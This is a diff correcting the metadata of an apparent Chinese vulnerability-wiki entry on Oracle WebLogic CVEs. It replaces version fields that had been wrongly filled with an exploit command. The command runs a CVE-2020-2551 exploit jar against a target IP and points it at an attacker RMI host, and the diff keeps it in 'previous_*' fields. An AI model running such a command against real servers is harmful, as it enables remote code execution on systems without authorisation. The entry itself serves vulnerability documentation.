@@ -1,5 +1,5 @@
 ---
-version: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
+version: "unknown"
 source: "MrWQ/vulnerability-paper"
 title: "中间件常见漏洞之 weblogic"
 product: "Oracle WebLogic / conditional Redis chain"
@@ -13,16 +13,20 @@ referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3
 identifier_role: "primary"
 cve: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551; CVE-2021-2109"
 prerequisites: "Per-section patch/runtime/protocol/test-page/auth/Redis write conditions; not all product-wide"
-affected_versions: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
+affected_versions: "unknown"
 source_url: "https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA"
 source_status: "recorded"
 side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
 id: "vw-9b26c32610cdfbbc61d77bcf"
 entity_id: "ve-9b26c32610cdfbbc61d77bcf"
 schema_version: "1"
+previous_version: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
+previous_affected_versions: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
 ---
 
 # 中间件常见漏洞之 weblogic
+
+> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。
 
 <!-- vulwiki-editorial:start -->
 ## 校订与适用边界
